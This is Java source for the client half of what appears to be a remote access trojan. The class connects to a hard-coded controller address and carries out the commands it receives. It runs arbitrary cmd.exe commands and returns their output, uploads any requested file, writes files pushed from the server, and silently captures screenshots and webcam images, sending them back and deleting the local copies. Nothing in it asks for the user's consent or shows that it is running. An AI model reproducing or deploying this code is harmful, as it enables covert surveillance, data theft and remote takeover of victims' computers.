import java.awt.AWTException;
import java.awt.HeadlessException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

import javax.imageio.ImageIO;
import javax.swing.JOptionPane;
import javax.swing.SwingUtilities;

import org.w3c.dom.ranges.RangeException;

import com.github.sarxos.webcam.Webcam;
import com.github.sarxos.webcam.WebcamResolution;

public class client {
	private ObjectOutputStream output;
	private ObjectInputStream input;


	private String serverIP ="127.0.0.1";
	private Socket client;




	client(){
		startClient();
	}
	
	public void startClient(){
		while(true){
			try {
				openConnection();
				client_connection_loop();

			} 
			catch (IOException e) {
				displayMessage("\nIOexception\n");
			}
		}
	}
	
	private void openConnection() throws IOException{
		displayMessage("Attempting connection\n");
		client = new Socket(InetAddress.getByName(serverIP), 12349);		
		displayMessage("Connected to: " + client.getInetAddress().getHostName());

		//ObjectOutputStream **MUST** be created first
		output = new ObjectOutputStream(client.getOutputStream());
		output.flush();
		input = new ObjectInputStream(client.getInputStream());

		displayMessage("\nGot I/O streams\n");

	}
	
	private void displayMessage(final String messageToDisplay){
		SwingUtilities.invokeLater(new Runnable() {
			@Override
			public void run() {
				System.out.println(messageToDisplay);
			}
		});
	}
	

private void send_message(Message message) throws ConnectionLostException{
	try {
		output.writeObject(message);
		output.reset();
		output.flush();
	} 
	catch (IOException e) {
		//e.printStackTrace();
		System.out.println("\nmessage is broken IOexception\n");

		closeConnection();

		throw new ConnectionLostException();
	}


}

Message set_message(String control, String value) {
	Message m = new Message();
	m.control = control;
	m.value = value;
	return m;
}
	
	private Message receive_message() throws ConnectionLostException {

		Message m;
		try {
			m = (Message) input.readObject();
		} catch (ClassNotFoundException | IOException e) {
			closeConnection();
			throw new ConnectionLostException();
		}
		return m;
	}
	private void closeConnection(){
		displayMessage("\nClosing connection\n");
		try{
			output.close();
			input.close();
			client.close();
		}
		catch (IOException e) {
			e.printStackTrace();
		}
	}
	void OPERATION_show_message(Message m) {
		JOptionPane.showMessageDialog(null,  m.value, "alert",JOptionPane.ERROR_MESSAGE);
	}	
	private void client_connection_loop() throws IOException{

		while(true){
			try {

				Message m;

				//get the message 
				try {
					m = receive_message();
				} 
				catch (Exception e1) {
					return;
				}


				//decide the process
				if(m.control.equals("showmessage")) {
					OPERATION_show_message(m);
				}

				if(m.control.equals("sendfile")) {
					Operation_recieve_file(m);
				}
				 
				if(m.control.equals("getfile")) {
					getfile(m);
				}

				if(m.control.equals("screenshot")) {
					OPERATION_screenshot(m);
				}
				if (m.control.equals("cmdcommand")) {
					cmdcommand(m);
				}
				
				if (m.control.equals("webcamshot")) {
					Operation_Webcam(m);
				}

			} 
			
			catch (Exception e) {
				displayMessage("\nUnknown object type recevied");
				break;
			}
		}

	}

	private void getfile(Message m) {
		//checks files existance
				String path = m.value;
				File file = new File(path);


				if(file.exists()) {
					m = set_message("ispathexists","yes");

					try {
						send_message(m);
					} 
					catch (ConnectionLostException e) {
						return;			
					}

					send_file(path);

				}
				else {
					m = set_message("ispathexists","no");

					try {
						send_message(m);
					} 
					catch (ConnectionLostException e) {
						return;			
					}

				}
	}
	void receive_file(String path) {
		File f = new File(path);

		byte[] content;

		try {
			content = (byte[]) input.readObject();
			Files.write(f.toPath(), content);
		} 
		catch (ClassNotFoundException | IOException e1) {
			e1.printStackTrace();
			System.out.println("file read error");
		}
	}
	
	private void Operation_recieve_file(Message m) {
		String path = m.value;
		if(!path.equals("") || !path.replaceAll(" ","").equals("")) {
			//seperate path from filename
			Path p = Paths.get(path);
			String dir = p.getParent().toString();
			String name = p.getFileName().toString();
			//checks folders existance
			File folder = new File(dir);
			File file = new File(path);
			

			if(folder.isDirectory() && !file.exists()) {
				
				receive_file(path);
			}
			else {
				path = "Hata";
				receive_file(path);
			}
		}
		else {
			path = "Hata";
			receive_file(path);
		}
	}
	private void OPERATION_screenshot(Message m) {

		String ss_path = "C:\\Programdata\\screenshot.png";

		try {
			BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
			ImageIO.write(image, "png", new File(ss_path));
		} catch (HeadlessException | AWTException | IOException e1) {
			System.out.println("ss error");
			e1.printStackTrace();
		}

		send_file(ss_path);

		File file = new File(ss_path);
		file.delete();

	}

	private void send_file(String path) {

		File f = new File(path);
		byte[] content;

		try {
			content = Files.readAllBytes(f.toPath());
			output.writeObject(content);
			output.reset();
			output.flush();

		} catch (IOException e) {
			e.printStackTrace();
			System.out.println("file write error");
		}
	}
	
	private void cmdcommand(Message m) throws ConnectionLostException {
		StringBuilder sbuild = new StringBuilder();
		 try {
             ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", m.value);
             builder.redirectErrorStream(true);
             Process p = builder.start();
             BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
             String line;
             while(true) {
                 line = r.readLine();
                 if(line == null) {break;}
                 sbuild.append(line+"\n");
             }
             System.out.println("m.value is ===> "+ m.value);
             m.value = sbuild.toString();
             System.out.println("builder value is ====> "+sbuild.toString());
             m= set_message("cmdsend", m.value);
             try {
                 send_message(m);

             }catch (ConnectionLostException e) {
            	 return;
			}
            
         }catch(IOException io) {

         }
	}


public void Operation_Webcam(Message m) {
		new Thread(new Runnable() {
		
			@Override
			public void run() {
				// TODO Auto-generated method stub
				String filename = "C:\\Programdata\\shot.png";
				Webcam webcam = Webcam.getDefault();

				try {
					webcam.setViewSize(WebcamResolution.HD.getSize());
					webcam.open();
					ImageIO.write(webcam.getImage(), "PNG", new File(filename));
					webcam.close();
				}catch(IllegalArgumentException | IOException e) {
					try {
						webcam.setViewSize(WebcamResolution.VGA.getSize());
						webcam.open();
						webcam.close();
						ImageIO.write(webcam.getImage(), "PNG", new File(filename));
					}catch(IllegalArgumentException | IOException r) {
						webcam.getDefault();
						webcam.open();
						try {
							ImageIO.write(webcam.getImage(), "PNG", new File(filename));
							webcam.close();
						} catch (IOException e1) {
							// TODO Auto-generated catch block
							e1.printStackTrace();
						}
					}
				}
				send_file(filename);
				File file = new File(filename);
				file.delete();
			}
		}).start();

	
}

	
	
}
